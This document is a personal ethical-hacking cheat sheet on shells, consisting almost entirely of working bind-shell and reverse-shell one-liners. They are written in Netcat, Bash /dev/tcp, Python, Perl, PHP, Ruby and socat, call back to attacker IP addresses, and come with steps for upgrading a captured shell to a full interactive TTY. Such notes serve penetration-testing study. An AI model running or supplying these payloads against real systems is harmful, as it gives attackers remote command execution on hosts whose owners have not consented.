# Shells

[TOC]

## Bind Shell

Runs a server process on the target (open a port) that waits for connections from the attacker machine

![](D:\SEGURANCA\01_Apontamentos\Ethical_Hacking\3_Exploitation\img\netcat_bind_shell.jpg)

#### Netcat

```bash
#Setup a Netcat listener on the target
nc -lvnp <listen-port> –e /bin/bash

#Connect to target
nc <attacker_ip> <listen-port>
```

#### Python

```python
#Setup a listener on the target
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
```

#### Python

```python
#Setup a listener on the target
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
```

#### Perl

```perl
#Setup a listener on the target
perl -e 'use Socket;$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```

#### PHP

```php
#Setup a listener on the target
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",2222);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'
```

#### Ruby

```ruby
#Setup a listener on the target
ruby -rsocket -e 'f=TCPServer.new(2222);s=f.accept;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",s,s,s)'
```


## Reverse Shell

Open a port on attacker machine, connect back to it with the target (could help evade firewalls)

![](D:\SEGURANCA\01_Apontamentos\Ethical_Hacking\3_Exploitation\img\netcat_reverse_shell.jpg)

[Reverse Shell - Cheat Sheet](https://github.com/flakpaket/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

#### Netcat

```bash
#Setup a Netcat listener on the attacker box
nc -lvnp <listen-port>

#Target host connect to attacker box (Linux)
nc <attacker_ip> <listen-port> –e /bin/bash

#Target host connect to attacker box (Windows)
nc <attacker_ip> <listen-port> –e cmd.exe
```

#### Bash TCP

```bash
#Initiate a reverse shell from the target
bash -i >& /dev/tcp/192.168.100.113/4444 0>&1
```

#### Bash UDP

```bash
#Victim:
bash -i >& /dev/udp/127.0.0.1/4242 0>&1

#Listener:
nc -u -lvp 4242
```

#### Python

```python
#Initiate a reverse shell from the target - IPv4
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#Initiate a reverse shell from the target - IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 
```

#### Perl

```perl
#Initiate a reverse shell from the target
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### PHP

```php
#Initiate a reverse shell from the target
php -r ‘$sock=fsockopen(“192.168.100.113”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);’
```



## Upgrade to Interactive Shell (Spawning)

#### Method 1: Python pty module

+ No tab-completion or history and SIGINT (Ctrl-C) will still close Netcat

```python
bash -i  
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### Method 2: Using socat

```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

#### Method 3: Upgrading from netcat

```bash
#In reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

#In Attacker
echo $TERM   # get TERM type (usually "xterm-256color")
stty -a      # get the size of the current TTY
stty raw -echo
fg

#In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```



## WebShells

